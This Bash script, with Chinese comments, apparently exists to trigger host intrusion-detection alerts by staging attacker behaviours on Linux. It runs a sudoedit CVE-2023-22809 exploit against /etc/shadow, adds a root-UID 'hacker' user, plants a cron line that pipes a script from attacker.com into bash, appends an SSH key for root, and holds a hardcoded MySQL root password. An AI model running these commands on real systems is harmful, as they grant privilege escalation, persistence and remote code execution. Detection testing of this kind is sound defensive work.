#!/bin/bash

# 全局配置
QUITE_MODE=false

# MYSQL 配置
MYSQL_USER="root"
MYSQL_PASSWORD="R0ck9@linx"

# 函数执行顺序列表
FUNCTION_ORDER=(
    "0001-CVE-2023-22809"
    "0002-find"
    "0003-Illegal_users_add"
    "0004-illgal_cron_add"
    "0005-Prev_udf_exec"
    "0006-Prev_udf_funtion_create"
    "0007-Prev_udf_so_create"
    "0008-read_filesystem_info" # 未触发
    "0009-read_grep_password"
    "0010-read_history_or_last"
    "0011-read_passwd"
    "0012-read_password"
    "0013-Reverse_normal"
    "0014-rm_auth_log"
    "0015-SSH_faild"
    "0016-SSH_success"
    "0017-sshkey_add"
    "0018-sudo_chroot"
    "0019-suid_cat"
)

# 函数信息配置
declare -A FUNCTION_INFO=(
    ["0001-CVE-2023-22809"]="通过 sudoedit 编辑文件或 SUDO_EDITOR 环境变量注入，实现提权"
    ["0002-find"]="find 查找特权文件"
    ["0003-Illegal_users_add"]="不使用useradd、adduser等程序非法添加用户"
    ["0004-illgal_cron_add"]="非法添加计划任务"
    ["0005-Prev_udf_exec"]="Mysql系统命令执行(手动)"
    ["0006-Prev_udf_funtion_create"]="Mysql危险函数创建(手动)"
    ["0007-Prev_udf_so_create"]="Mysql.so文件写入(手动)"
    ["0008-read_filesystem_info"]="查找隐藏或root目录下的文件"
    ["0009-read_grep_password"]="查找password相关文件"
    ["0010-read_history_or_last"]="查看history文件或执行last"
    ["0011-read_passwd"]="读取/etc/passwd敏感文件"
    ["0012-read_password"]="读取/etc/passwd敏感文件"
    ["0013-Reverse_normal"]="反向shell(手动)"
    ["0014-rm_auth_log"]="查找隐藏或root目录下的文件"
    ["0015-SSH_faild"]="SSH连接失败(手动)"
    ["0016-SSH_success"]="SSH连接成功(手动)"
    ["0017-sshkey_add"]="ssh密钥添加行为"
    ["0018-sudo_chroot"]="sudo命令chroot提权(手动)"
    ["0019-suid_cat"]="利用cat进行suid提权(手动)"
)

function mysql_exec() {
    local mysqld_pid=0
    local cmd="$@"

    echo "启动 MySQL 后台进程..."
    mysqld --user="$MYSQL_USER" &

    mysqld_pid=$!

    echo "等待 MySQL 启动..."
    sleep 10

    if ! pgrep -x "mysqld" > /dev/null; then
	    echo "MySQL 启动失败"
	    exit 1
    fi

    echo "连接到 MySQL 交互式终端"
    expect << EOF
        spawn mysql -u "$MYSQL_USER" -p
        expect "Enter password:"
        send "$MYSQL_PASSWORD\r"
        expect "mysql>"

        send "$cmd\r"
        expect "mysql>"

        send "exit\r"
        expect eof
EOF

    echo "终止进程"
    kill -9 "$mysqld_pid"
}

function 0001-CVE-2023-22809() {
    EDITOR='vim -- /etc/shadow' sudoedit /etc/test
}

function 0002-find() {
    find /tmp -name "*pass*"
}

function 0003-Illegal_users_add() {
    echo "  非法添加用户"
    echo "hacker:x:0:0:Hacker:/root:/bin/bash" >> /etc/passwd

    echo "  删除非法添加的用户"
    sed -i '$d' /etc/passwd
}

function 0004-illgal_cron_add() {
    echo "  非法添加计划任务"
    echo "* * * * * root curl http://attacker.com/shell.sh | bash" > /etc/cron.d/persist

    echo "  删除非法添加的计划任务"
    sed -i '$d' /etc/cron.d/persist
}

function 0005-Prev_udf_exec() {
    # local cmd="SELECT sys_exec('cat /etc/shadow');"
    # mysql_exec $cmd
    echo ""
}

function 0006-Prev_udf_funtion_create() {
    echo ""
}

function 0007-Prev_udf_so_create() {
    echo ""
}

function 0008-read_filesystem_info() {
    ls -al /root
}

function 0009-read_grep_password() {
    touch /tmp/1.txt
    grep "password" /tmp/1.txt
    rm -rf /tmp/1.txt
}

function 0010-read_history_or_last() {
    last
}

function 0011-read_passwd() {
    cat /etc/passwd
}

function 0012-read_password() {
    tail /etc/passwd
}

function 0013-Reverse_normal() {
    echo ""
}

function 0014-rm_auth_log() {
    vim -c "q" /var/log/secure
}

function 0015-SSH_faild() {
    echo ""
}

function 0016-SSH_success() {
    echo ""
}

function 0017-sshkey_add() {
    echo "  添加ssh密钥"
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAr..." >> /root/.ssh/authorized_keys

    echo "  删除添加的ssh密钥"
    sed -i '$d' /root/.ssh/authorized_keys
}

function 0018-sudo_chroot() {
    echo ""
}

function 0019-suid_cat() {
    echo ""
}

# 显示使用帮助
function show_help() 
{
    echo "使用方法： $0 [选项]"
    echo "选项:"
    echo "  -a, --all                   执行所有函数（默认）"
    echo "  -f, --function <名称>       执行指定名称的函数"
    echo "  -r, --range <start-end>     执行指定范围内的函数（例如：2-4）"
    echo "  -q, --quiet                 屏蔽函数的输出（只显示脚本信息）"
    echo "  -l, --list                  列出所有可用函数"
    echo "  -h, --help                  显示此帮助信息"
    echo ""
    echo "示例："
    echo "  $0 -f function3                 # 只执行function3"
    echo "  $0 -r 2-4                       # 执行第2到第4个函数"
    echo "  $0 -f function2 -f function5    # 执行functon2和functon5" 
}

function list_functions()
{
    echo "可用函数列表:"
    echo "============================================================="
    
    local counter=1
    for func in "${FUNCTION_ORDER[@]}"; do
        printf "%2d. %-30s - %s\n" "$counter" "$func" "${FUNCTION_INFO[$func]}"
        ((counter++))
    done
}

function execute_function()
{
    local func_name=$1

    if [ "$QUITE_MODE" = true ]; then
        $func_name > /dev/null 2>&1
    else
        $func_name
    fi
}

function run_selected_functions()
{
    local functions_to_run=("$@")
    local counter=1

    if [ "$QUITE_MODE" = true ]; then
        echo "静默模式：已启用（函数输出将被屏蔽）"
    else
        echo "详细模式：已启用（显示所有输出）"
    fi

    echo "开始执行脚本..."
    echo "============================================================="

    counter=1
    for func in "${functions_to_run[@]}"; do
        echo "[$counter]:$func ${FUNCTION_INFO[$func]}"

        execute_function "$func"

        if [ $? -eq 0 ]; then
            echo "函数执行成功"
        else
            echo "函数执行失败（退出码：$?）"
        fi

        echo "-------------------------------------------------------------"

        # 如果不是最后一个函数，则添加延迟
        if [ "$counter" -lt "${#functions_to_run[@]}" ]; then
            sleep 1
        fi

        ((counter++))
    done

    echo "选定函数执行完毕！"
    echo "总共执行了 ${#functions_to_run[@]} 个函数"
}

function main()
{
    local functions_to_run=()

    # 如果没有参数，默认执行所有函数
    if [ $# -eq 0 ]; then
        functions_to_run=("${FUNCTION_ORDER[@]}")
    fi

    # 解析命令行参数
    while [[ $# -gt 0 ]]; do
        case $1 in
            -a|--all)
                functions_to_run=("${FUNCTION_ORDER[@]}")
                shift
                ;;
            -f|--function)
                if [ -n "$2" ] && [[ ! "$2" =~ ^- ]]; then
                    if [[ -v FUNCTION_INFO[$2] ]]; then
                        functions_to_run+=("$2")
                    else
                        echo "错误：函数 '$2' 不存在"
                        exit 1
                    fi
                    shift 2
                else
                    echo "错误：-f|--function 需要参数值"
                    exit 1
                fi
                ;;
            -r|--range)
                if [ -n "$2" ] && [[ "$2" =~ ^[0-9]+-[0-9]+$ ]]; then
                    local start=${2%-*}
                    local end=${2#*-}

                    if [ "$start" -gt "$end" ]; then
                        echo "错误：起始序号不能大于结束序号"
                        exit 1
                    fi

                    if [ "$start" -lt 1 ] || [ "$end" -gt "${#FUNCTION_ORDER[@]}" ]; then
                        echo "错误：范围超出有效函数序号 (1-${#FUNCTION_ORDER[@]})"
                        exit 1
                    fi

                    for ((i=start; i <= end; ++i)); do
                        functions_to_run+=("${FUNCTION_ORDER[$((i-1))]}")
                    done
                    shift 2
                else
                    echo "错误：--range 需要有效的范围参数（例如：2-4）"
                    exit 1
                fi
                ;;
            -q|--quite)
                QUITE_MODE=true
                shift
                ;;
            -l|--list)
                list_functions
                exit 0
                ;;
            -h|--help)
                show_help
                exit 0
                ;;
            *)
                echo "错误：未知选项 $1"
                show_help
                exit 1
                ;;
        esac
    done

    # 如果没有指定要运行的函数，使用默认所有函数
    if [ ${#functions_to_run[@]} -eq 0 ]; then
        functions_to_run=("${FUNCTION_ORDER[@]}")
    fi

    run_selected_functions "${functions_to_run[@]}"
}

main "$@"
